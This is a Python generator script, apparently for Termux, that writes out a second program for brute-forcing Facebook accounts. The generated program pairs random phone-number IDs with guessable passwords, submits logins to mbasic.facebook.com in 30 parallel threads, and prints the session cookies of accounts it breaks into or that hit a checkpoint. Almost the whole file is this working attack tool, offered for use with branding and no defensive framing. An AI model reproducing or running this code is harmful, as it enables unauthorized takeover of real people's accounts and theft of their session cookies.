#code by HeronAfridi
import os,time,sys,random
def line():
    print("\033[1;90m———————————————————————————————————\x1b[0m")




mylogo="""
\033[1;97m88""Yb 88   88 88b 88 88b 88 \033[1;91mYb  dP 
\033[1;97m88__dP 88   88 88Yb88 88Yb88  \033[1;91mYbdP  
\033[1;97m88""Yb Y8   8P 88 Y88 88 Y88  \033[1;91m 8P   
\033[1;97m88oodP `YbodP' 88  Y8 88  Y8  \033[1;91mdP    
\033[1;90m———————————————————————————————————
 \033[1;97m[\033[47m\033[1;92m>)\x1b[0m\033[1;97m OWNER       : Bunny(ᗒᗣᗕ)՞
 \033[1;97m[\033[47m\033[1;92m>)\x1b[0m \033[1;97mFACEBOOK    : Md Banny 
 \033[1;97m[\033[47m\033[1;92m>)\x1b[0m \033[1;97mGITHUB      : \033[1;92mBUNNY-143
\033[1;90m———————————————————————————————————"""

def clear():
    os.system("clear")

def nola():
    clear()
    print(mylogo)
    print(" [1] MAKE RANDOM CLONEING TOOL")
    print(" [2] MORE COMEING SOON")
    print(" [3] MORE COMEING SOON")
    line()
    kkk=input(" [•_•] CHOOSE:")
    if kkk in["1"]:
        random_()
    if kkk not in["1"]:
        nola()
        
        
def random_():
    clear()
    print(mylogo)
    name=input(" [<•|] YOUR NAME =")
    number=input(" [<•|] YOUR NUMBER =")
    line()
    import_m="""
# TOOLS MADE BY HeronAfridi
import os
import sys
import random
import string
import time
import re
from os import system as _HERON_
from concurrent.futures import ThreadPoolExecutor as ThreadPool
os.system("pkg install espeak")
try:
    import requests
except:
    _HERON_("pip install requests")
    import requests
from requests.exceptions import ConnectionError

#-----------[+_+]
oks=[]
loop=0
user=[]
hEROn=[]
org=[]

session = requests.Session()
"""

    proxy="""
try:
    os.system('clear')
    try:os.system('rm -rf .proxy.txt')
    except:pass
    uno = requests.get("https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all").text
    open('.proxy.txt','w').write(uno)
except requests.exceptions.ConnectionError:
    sys.exit(f" [//] INTERNET CONNECTION ERROR")
XXL= open('.proxy.txt','r').read().splitlines()"""


    log="""
def logo():
    print(\"\"\"
    \033[1;90m———————————————————————————————————
    \033[1;97m[\033[47m\033[1;92m>)\x1b[0m\033[1;97m OWNER       : """+name+"""
    \033[1;97m[\033[47m\033[1;92m>)\x1b[0m \033[1;97mFACEBOOK    : """+name+"""
    \033[1;97m[\033[47m\033[1;92m>)\x1b[0m \033[1;97mNUMBER      : \033[1;92m"""+number+"""
    \033[1;90m———————————————————————————————————\"\"\")"""
    
    main="""
def Main():
    user=[]
    os.system('clear')
    logo()
    print(' \033[1;91m[>] \033[1;96mEXAMPLE : \033[1;92m017 \033[1;91m/ \033[1;92m018\033[1;91m / \033[1;92m 019\033[1;91m / \033[1;92m 016')
    print("\033[1;32m ->->->->->->->->->->->->->->->->->->->->->->->")
    code = input(' \033[1;91m[>] \033[1;96mCRACKING CODE : \033[1;92m')
    os.system('clear')
    logo()
    print(' \033[1;91m[>] \033[1;96mEXAMPLE :   \033[1;92m10000\033[1;91m/\033[1;92m20000/\033[1;91m\033[1;92m30000\033[1;91m/\033[1;92m50000 ')
    print("\033[1;32m ->->->->->->->->->->->->->->->->->->->->->->->")
    limit = int(input(' \033[1;91m[>]\033[1;96m CRACK LIMIT : \033[1;92m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=30) as asha:
        os.system('clear')
        logo()
        tl = str(len(user))
        print("    \033[1;90m———————————————————————————————————")
        print(f'\033[1;96m            WAITING FOR OK IDS')
        print("    \033[1;90m———————————————————————————————————")
        for love in user:
            uid = code+love
            pwx = [love[2:],love]
            asha.submit(tool,uid,pwx,tl)
    print('-------------------')
    print(' [~] WORK IS DONE BABE')
    print(' [+] Ids saved in MUHIB-OK.txt,-CP.txt')
    print('-------------------') """
    submit="""
def tool(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            max = random.choice(XXL)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method': 'GET',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': max}
            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print(f"\x1b[1;32m["""+name+"""]  {cid} - {ps}          ")
                print(f"\033[1;91m[>]\033[1;92m=COOKIES : \033[1;96m{coki}")
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[1;30m["""+name+"""-CP] {uid} | {ps}   ")
                #print(f"\033[1;92m=[/]=COOKIES : {coki}")
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        org.append(uid)
        os.system(f"espeak {str(len(org))}")
        time.sleep(0.0001)
    except:
        pass
        
Main()

"""
    open("/sdcard/Random.py","w").write(import_m+"\n"+proxy+"\n"+log+"\n"+main+"\n"+submit)

random_()